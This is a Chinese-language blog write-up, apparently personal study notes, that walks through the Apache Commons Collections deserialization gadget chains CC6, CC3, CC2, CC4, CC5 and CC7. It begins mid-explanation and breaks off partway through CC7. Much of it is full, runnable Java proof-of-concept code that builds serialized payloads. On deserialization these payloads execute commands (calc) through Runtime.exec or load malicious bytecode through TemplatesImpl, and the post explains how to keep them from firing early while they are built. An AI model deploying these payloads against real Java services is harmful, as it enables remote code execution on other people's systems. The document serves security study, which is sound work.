tiedMapEntry &#x3D; new TiedMapEntry(decorate, Runtime.class); tiedMapEntry.hashCode(); 后面就是怎么调hashCode了，如果跟过URLDNS的应该很容易想到就是HashMap 在HashMap重写的readObject里调用了hash函数，而hash函数里就调用了hashCode方法 假设此时的key是tiedMapEntry，整个链子就能成功执行了 按照我们的想法，这个poc该这么构造 Transformer[] t &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t); HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;(); objectObjectHashMap.put(&quot;sds&quot;,&quot;sss&quot;); Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap, chainedTransformer); TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,&quot;123&quot;); HashMap&lt;Object, Object&gt; hashMap &#x3D; new HashMap&lt;&gt;(); hashMap.put(tiedMapEntry, &quot;123&quot;); ser(decorate); unser(); 完善看起来链子很完美，但实际上如果真正运行不会运行成功 他会提示java.lang.ProcessImpl这个类不能进行序列化，为什么会出现这个类呢，原因就是hashMap.put， put方法会调用hashCode，然后调用TiedMapEntry类里的get方法，恰好get方法里还有个put 而其中的value就是我们命令执行后的一个java.lang.ProcessImpl类型的值 导致执行完后decorate里的内容变为了 造成了无法序列化的问题 另外put后调用的LazyMap的get方法在map中没有这个key，也就是在decorate中没有对应的key时将这个key加入decorate，那么在反序列化时，由于decorate已经有了这个key，所以就不满足if判断，直接return了 解决这两个问题都很好办，因为这个键值对的key就是TiedMapEntry里我们传入的第二个参数 所以用decorate.remove(tiedMapEntry.getKey());或者decorate.clear();删了就行（如果是用删除的方法，在用idea调试的过程中不要去看tiedMapEntry属性的值，因为这样会调用tiedMapEntry类中的toString，然后再调getValue，我们前边的删除就白删了） 还有一个问题是如果objectObjectHashMap里有值，那么调用的HashMap里的readObject的key和value第一次就是objectObjectHashMap的key和value，第二次才会到hashMap的键值，很怪，不知道为什么。可能是因为两个HashMap对象反序列化的时候是一块调用的同一个readObject 但如果没有值，key的值就是TiedMapEntry类型的对象 另外由于put的原因，所以在生成的时候也会调用我们的链，所以这里可以利用反射的方式去修改tiedMapEntry里的内容，让其不会执行命令。这里是修改LazyMap的内容 Class LazyMapClass &#x3D; LazyMap.class; Field factory &#x3D; LazyMapClass.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(decorate,chainedTransformer); 在put后把factory的值改为我们构造的chainedTransformer，而在LazyMap初始化时的Transformer可以随便填一个Transformer，比如new ConstantTransformer(1)。另外这样还可以让在put时调用的LazyMap的get方法里的put就会变成123=1了，不会出现java.lang.ProcessImpl类型影响反序列化 最终的payload为 package org; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class HashMapTest &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123; Transformer[] t &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t); HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;(); &#x2F;&#x2F; objectObjectHashMap.put(&quot;111&quot;,&quot;222&quot;); Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap,new ConstantTransformer(1)); TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,&quot;123&quot;); HashMap&lt;Object, Object&gt; hashMap &#x3D; new HashMap&lt;&gt;(); hashMap.put(tiedMapEntry, &quot;123&quot;); Class LazyMapClass &#x3D; LazyMap.class; Field factory &#x3D; LazyMapClass.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(decorate,chainedTransformer); &#x2F;&#x2F; decorate.remove(tiedMapEntry.getKey()); decorate.clear(); ser(hashMap); unser(); &#125; public static void ser(Object obj) throws IOException &#123; ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;))); oos.writeObject(obj); &#125; public static void unser() throws IOException, ClassNotFoundException &#123; ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;))); oi.readObject(); &#125; &#125; 总结调用链为： HashMap -&gt; readObject TiedMapEntry -&gt; hashCode TiredMapEntry -&gt; getValue LazyMap -&gt; get ​ ChainedTransformer.transform() ​ ConstantTransformer.transform() InvokerTransformer -&gt; transform CC3CC3和上面写的CC1和CC6有不小的区别，最大的区别就是原本的 CC1 链与 CC6 链是通过 Runtime.exec() 进行命令执行。 而在CC3里，是通过动态类加载机制来执行恶意代码 动态类加载机制在类加载的过程中，我们知道字节码加载过程是 loadClass -&gt; findClass -&gt; defineClass 而在Java | Ethe&#39;s blog (ethe448.github.io)的类加载机制的部分，我们展示了一种通过ClassLoader.defineClass 字节码加载任意类的攻击方式 不过单纯的调用defineClass是不能执行类的，若要执行就必须先进行实例化 而CC3恰好就是找到了利用defineClass并进行了实例化实现的反序列化攻击 TemplatesImpl类 defineClass被重载了好几次，这里随便讲两个 name为类名，b为字节码数组，off为偏移量，len为字节码数组的长度。 现在我们的 defineClass() 方法的作用域为 protected，我们需要找到作用域为 public 的类，方便我们利用。 IDEA里右键查找用法 最后会在TemplatesImpl.TransletClassLoader里的defineClass找到一个可以利用的地方，这里没有标注作用域，也就是默认的default属性，在同一个包下可以访问 我们再找一下调用它的函数 又被defineTransletClasses调用了，但是又是个private，所以还要接着找 还是TemplatesImpl这个类，getTransletInstance调用了defineTransletClasses 这里的_class值会在defineTransletClasses里赋值为defineClass加载后的字节码，然后再借助后面的newInstance就能实现恶意类的实例化，然后执行恶意代码。但是这个还是private，所以还要去找一个public的。 恰好这里就有一个 找到这里之后我们就可以先想办法去利用我们之前找到的这些去试着动态加载类了 TemplatesImpl利用理论上只要调用new TemplatesImpl()，然后调用newTransformer方法就能到达defineClass()，然后加载恶意类。但在这里面还有一些代码逻辑上的问题 首先这里遇到的问题就是在getTransletInstance方法里的两个if判断 要让_name不为null，还要让_class为null 这两个都是类里的私有变量，而TemplatesImpl的公共的构造函数是个空函数 也就是说我们只能利用反射的方式来进行赋值了 在defineTransletClasses里也有一个if判断 _bytecodes不能为null，不然会直接抛出异常 而且他还是我们想要执行的恶意类，一个字节的二维数组类型 另外这个_tfactory也不能为空，不然也会报错 这里我们生成一个恶意类的字节码文件 写完后现在的代码为 TemplatesImpl templates &#x3D; new TemplatesImpl(); &#x2F;&#x2F; _name赋值不为null Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;123&quot;); &#x2F;&#x2F; _class赋值为null Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;); classField.setAccessible(true); classField.set(templates,null); &#x2F;&#x2F;加载恶意类的字节码 Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;)); &#x2F;&#x2F;转为二维数组 byte[][] codes &#x3D; &#123;code&#125;; &#x2F;&#x2F;_tfactory赋值 bytecodes.set(templates,codes); Field tfactory &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates,new TransformerFactoryImpl()); templates.newTransformer(); 但是执行后报了空指针异常 在TemlatesImpl的defineTransletClasses方法里，第422行 下个断点能看出来因为不满足if判断，进入了else中，然后又因为_auxClasses的值为空，导致的空指针异常 但是这里我们要选让程序满足if判断的方式，而不是给_auxClasses赋值，因为在下面还有一个对_transletIndex的判断（两个都改了也能弹计算器，而且感觉更简单一点 接下来说一下满足if判断的方式 这里superClass是我们构造的恶意类的父类，所以这个if判断就是让我们恶意类的父类的名称和这个ABSTRACT_TRANSLET一样 这个ABSTRACT_TRANSLET是个被赋值的常量 所以只要让我们的恶意类继承一下com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet就好了 改完后重新编译一下 CC1的利用现在确定只要调用newTransformer方法就可以加载恶意类 那我们还记得在cc1里InvokerTransformer.transform可以以反射的方式去调用一些其他的方法 所以这里我们以反射调用newTransformer不就行了吗 这里我们改一改CC1的Transformer数组 Transformer[] t &#x3D; new Transformer[]&#123; new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;, null,null) &#125;; 然后前半部分用我们之前构造的，后面用CC1的就行 CC6的利用既然CC1可以，那CC6自然也可以，改的地方也一样，其余部分不动 CC3调用链好了，这里回到CC3 这里CC3的作者找到了一个TrAXFilter类 其中的构造函数里调用了newTransformer方法，templates也是可控的 但是这个TrAXFilter类没有实现Serializable接口，所以就不能进行序列化操作。但是就像Runtime也不能进行序列化操作一样，我们可以利用反射把TrAXFilter.class这个可以序列化的传过去，然后找到有函数中调用了类似于c =（a）.getConstructor(b)；c.newInstance(d)的语句，实现触发TrAXFilter构造函数的目的。 还真就有这样一个类里调用了这种语句 InstantiateTransformer类的transform函数，而且恰巧这些参数我们都能控制。 所以加上这两句 InstantiateTransformer instantiateTransformer &#x3D; new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;); instantiateTransformer.transform(TrAXFilter.class); 接下来就是找怎么去调用InstantiateTransformer的transform函数 其实还是CC1里的东西，既然CC1里可以调InvokerTransformer.transform，那也就可以调InstantiateTransformer.transform 调用成功 这里的Transformer[]一定要改为下面这个 Transformer[] t &#x3D; new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;) &#125;; 如果只用 new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})，会由于CC1的transform参数不可控不能构造成InstantiateTransformer.transform(TrAXFilter.class)，导致无法在反序列化时有实例化的TrAXFilter类 完整poc public class cc3 &#123; public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123; TemplatesImpl templates &#x3D; new TemplatesImpl(); &#x2F;&#x2F; _name赋值不为null Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;123&quot;); &#x2F;&#x2F; _class赋值为null Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;); classField.setAccessible(true); classField.set(templates,null); &#x2F;&#x2F;加载恶意类的字节码 Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;)); &#x2F;&#x2F;转为二维数组 byte[][] codes &#x3D; &#123;code&#125;; bytecodes.set(templates,codes); &#x2F;&#x2F;_tfactory赋值 Field tfactory &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates,new TransformerFactoryImpl()); InstantiateTransformer instantiateTransformer &#x3D; new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;); &#x2F;&#x2F; instantiateTransformer.transform(TrAXFilter.class); Transformer[] t &#x3D; new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;) &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t); HashMap map &#x3D; new HashMap(); map.put(&quot;value&quot;,&quot;value&quot;); Map decorate &#x3D; TransformedMap.decorate(map, null, chainedTransformer); &#x2F;&#x2F; &#x2F;&#x2F;创建AnnotationinvocationHandler的类对象 Class&lt;?&gt; AIH_construct &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); &#x2F;&#x2F;获取构造方法 Constructor&lt;?&gt; declaredConstructor &#x3D; AIH_construct.getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); Object o &#x3D; declaredConstructor.newInstance(Target.class, decorate); ser(o); unser(); &#125; public static void ser(Object obj) throws IOException &#123; ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;))); oos.writeObject(obj); &#125; public static void unser() throws IOException, ClassNotFoundException &#123; ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;))); oi.readObject(); &#125; &#125; 总结对于CC3 入口类是AnnotationinvocationHandler 执行类是TemplatesImpl 利用链是 AnnotationinvocationHandler.readObject AbstractInputCheckedMapDecorator.setValue Transformed.checkSetValue ChainedTransformer.transform ConstantTransformer.transform InstantiateTransformer.transform TrAXFilter TransformerImpl.newTransformer TransformerImpl.getTransletInstance TransformerImpl.defineTransletClasses TransformerImpl.defineClass CC2环境搭建CommonsCollections4.0 因为 CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。 4.1版本： 调用链CC2和CC1一样，最后的都是到InvokerTransformer.transform方法 所以前边这部分是一样的 Transformer[] t &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;&quot;cmd&quot;,&quot;&#x2F;c&quot;,&quot;calc&quot;&#125;&#125;) &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t); 接下来去找哪调用了transform方法 这里调了TransformingComparator的compare方法 这个transformer是可控的，构造函数里可以直接传 然后去找一下哪里调了compare 在PriorityQueue类的siftDownUsingComparator方法里 这个虽然是私有的，但是在PriorityQueue类的readObject方法里调了heapify方法，heapify方法又调了siftDown，然后在siftDown里实现了对siftDownUsingComparator的调用 不过这里有两个if判断 第一个if需要(size&gt;&gt;&gt;1)-1&gt;=0，为2就行 然后这里调两次add，就可以实现让size为2的目的 这个comparator也可以控制，也是我们必须要写的参数，所以第二个if可以忽略了，（TransformingComparator实现了Comparator接口，所以这里边可以写TransformingComparator 这里可以先写个poc了 public class cc2 &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; Transformer[] t &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;&quot;cmd&quot;,&quot;&#x2F;c&quot;,&quot;calc&quot;&#125;&#125;) &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t); TransformingComparator transformingComparator&#x3D;new TransformingComparator(chainedTransformer); PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(2, transformingComparator); priorityQueue.add(1); priorityQueue.add(1); ser(priorityQueue); &#x2F;&#x2F; unser(); &#125; public static void ser(Object obj) throws IOException &#123; ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;))); oos.writeObject(obj); &#125; public static void unser() throws IOException, ClassNotFoundException &#123; ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;))); oi.readObject(); &#125; &#125; 完善但是这里序列化的时候也弹计算器了，原因就是在第二次add的时候，不满足if判断进了siftUp里，然后在siftUp里也有个siftDownUsingComparator，导致提前执行了命令 这里就要用我们熟悉的反射了 最终poc package org.cc2; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.PriorityQueue; public class cc2 &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123; Transformer[] t &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;&quot;cmd&quot;,&quot;&#x2F;c&quot;,&quot;calc&quot;&#125;&#125;) &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t); TransformingComparator transformingComparator&#x3D;new TransformingComparator(chainedTransformer); PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(2, transformingComparator); Class aClass &#x3D; priorityQueue.getClass(); Field size &#x3D; aClass.getDeclaredField(&quot;size&quot;); size.setAccessible(true); size.set(priorityQueue,2); &#x2F;&#x2F; priorityQueue.add(1); &#x2F;&#x2F; priorityQueue.add(1); ser(priorityQueue); &#x2F;&#x2F; unser(); &#125; public static void ser(Object obj) throws IOException &#123; ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;))); oos.writeObject(obj); &#125; public static void unser() throws IOException, ClassNotFoundException &#123; ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;))); oi.readObject(); &#125; &#125; 这里计算器会弹两次，因为compare里调了两次transform 总结cc2的链挺短的，也挺简单 执行类是InvokerTransformer 入口类是PriorityQueue 调用链是 PriorityQueue.readObject PriorityQueue.siftDownUsingComparator TransformingComparator.compare InvokerTransformer.transform CC4cc4像是cc2和cc3的缝合品 使用了cc3的加载字节码的执行方式，但是前半部分用了cc2的链子 所以这里不分析了，简单写一下调用链 调用链PriorityQueue.readObject PriorityQueue.siftDownUsingComparator TransformingComparator.compare ChainedTransformer.transform ConstantTransformer.transform InstantiateTransformer.transform TrAXFilter TransformerImpl.newTransformer TransformerImpl.getTransletInstance TransformerImpl.defineTransletClasses TransformerImpl.defineClass poc package org.cc4; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import javax.xml.transform.Templates; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.PriorityQueue; public class cc4 &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123; TemplatesImpl templates &#x3D; new TemplatesImpl(); &#x2F;&#x2F; _name赋值不为null Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;123&quot;); &#x2F;&#x2F; _class赋值为null Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;); classField.setAccessible(true); classField.set(templates,null); &#x2F;&#x2F;加载恶意类的字节码 Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;)); &#x2F;&#x2F;转为二维数组 byte[][] codes &#x3D; &#123;code&#125;; bytecodes.set(templates,codes); &#x2F;&#x2F;_tfactory赋值 Field tfactory &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates,new TransformerFactoryImpl()); Transformer[] t &#x3D; new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;) &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t); TransformingComparator transformingComparator&#x3D;new TransformingComparator(chainedTransformer); PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(2, transformingComparator); Class aClass &#x3D; priorityQueue.getClass(); Field size &#x3D; aClass.getDeclaredField(&quot;size&quot;); size.setAccessible(true); size.set(priorityQueue,2); ser(priorityQueue); unser(); &#125; public static void ser(Object obj) throws IOException &#123; ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;))); oos.writeObject(obj); &#125; public static void unser() throws IOException, ClassNotFoundException &#123; ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;))); oi.readObject(); &#125; &#125; CC5CC5的环境又回到了CommonsCollections3 CommonsCollections1和CommonsCollections3因为AnnotaionInvocationHandler入口在jdk8中代码被修改了导致不能使用，所以CommonsCollections5换了一个入口，在调用链的构造中，也新加了一个TiedMapEntry作为中转。 分析CC5的后半段就是从LazyMap.get到InvokerTransformer.transform 这里和LazyMap链一样就不细说了，这里就说说前半段，要找到调用get方法的类，在CC6里我们用的是TiredMapEntry类的getValue方法，在CC5里也是它，但是在CC6里用的是它的hashCode方法来调用getValue方法，而在CC5里用的是它的toString方法 然后就去找有没有调用toString的（这个可太多了 在CC5里找的是BadAttributeValueExpException类的readObject方法 这里简单说一下readObject里的内容，要想到toString，就要满足两个if判断，首先val不为空，其次判断valObj是否是String类的实例或者是子类实例，如果都不满足，就进入最后一个elseif里调用valObj.toString，所以这里让valObj为TiredMapEntry类的就行了，这个在实例化的时候可以赋值 理想poc public class cc5 &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;(); Transformer[] t &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t); Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap, chainedTransformer); TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,&quot;123&quot;); BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(tiedMapEntry); ser(badAttributeValueExpException); unser(); &#125; public static void ser(Object obj) throws IOException &#123; ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;))); oos.writeObject(obj); &#125; public static void unser() throws IOException, ClassNotFoundException &#123; ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;))); oi.readObject(); &#125; &#125; 完善但是实际上上边的poc在序列化过程会执行命令，但是在反序列化过程中反而不会执行 原因就是在的构造函数里BadAttributeValueExpException public BadAttributeValueExpException (Object val) &#123; this.val &#x3D; val &#x3D;&#x3D; null ? null : val.toString(); &#125; 可以看到在构造的时候就已经调用了toString函数导致了命令执行，并且还改变了val的值，导致无法在反序列时执行 这里也是用反射，在实例化BadAttributeValueExpException对象时放个空值，然后再把里边的val值改了就行 最终poc package org.cc5; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class cc5 &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123; HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;(); Transformer[] t &#x3D; new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t); Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap, chainedTransformer); TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,&quot;123&quot;); BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(tiedMapEntry); Class aClass &#x3D; badAttributeValueExpException.getClass(); Field declaredField &#x3D; aClass.getDeclaredField(&quot;val&quot;); declaredField.setAccessible(true); declaredField.set(badAttributeValueExpException,tiedMapEntry); ser(badAttributeValueExpException); unser(); &#125; public static void ser(Object obj) throws IOException &#123; ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;))); oos.writeObject(obj); &#125; public static void unser() throws IOException, ClassNotFoundException &#123; ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;))); oi.readObject(); &#125; &#125; CC7分析CC7的后半部分还是调用lazymap的get方法然后到InvokerTransformer.transform 但是与其他的cc链不同，cc7利用AbstractMap的equals方法来调用lazymap的get方法 这里只要控制m是lazymap类的对象就可以了，这个m也就是我们传入的o 然后再去找调用了equals方法的类 cc7里用的是HashTable类的reconstitutionPut方法 这里的key是我们可控的，在HashTable的readObject方法里 这个key是从readObject方法里拿到的，那writeObject里应该也有 这里的话他进行序列化，首先写入了table的长度以及table的元素个数，然后取出table中的元素，放入entryStack，这里其实就是栈，然后把栈里面的每个元素用writeObject写入。 很明显了，这里传递的实际上就是HashTable#put时添加进去的key和value。 那么也就是说key是可控的，key可控所以e.key.equals(key)也可控 那么m就是我们可控的，然后达到调用lazymap.get的目的 编写poc虽然调用链已经弄清楚了，但是在编写poc之前还有几个要注意的地方 1.如何进入reconstitutionPut的for循环中 因为第一次put时table里是空的，不会进入for循环，而在第二次时，第一次的数据已经进入了table，这时候才会进入for循环 所以这里至少要put进两个不一样的LazyMap，就相当于有两个不一样的hashMap。（如果传入了相同的值，则 Hashtable#readObject 中的 elements 便会为 1，也就还是不会进入for循环 2.如何满足e.hash == hash 首先这里求hash的方法是key.hashCode()，key是我们的HashMap对象，也就是HashMap里的hashCode，可以跟一下最后调用的hashCode是这样的 Java的hashCode有点小bug &quot;yy&quot;.hashCode() &#x3D;&#x3D; &quot;zZ&quot;.hashCode() 所以只要让我们的hashMap的值分别为yy和zZ就能满足e.hash==hash然后去执行&amp;&amp;后面的 e.key.equals(key)了 3.如何调用AbstractMap这个抽象类里的equals方法 HashMap源码中的equals()定义是Entry类的，所以如果不是Entry类去调HashMap.equals，调用的其实就是它继承的AbstractMap抽象类里的equals 完善弹了，但是没完全弹 在序列化之前出现了一个无法被反序列化的实例 根据经验，这个就是因为在构造的时候执行了一遍命令，让其中一个值成为了java.lang.ProcessImpl类型的。 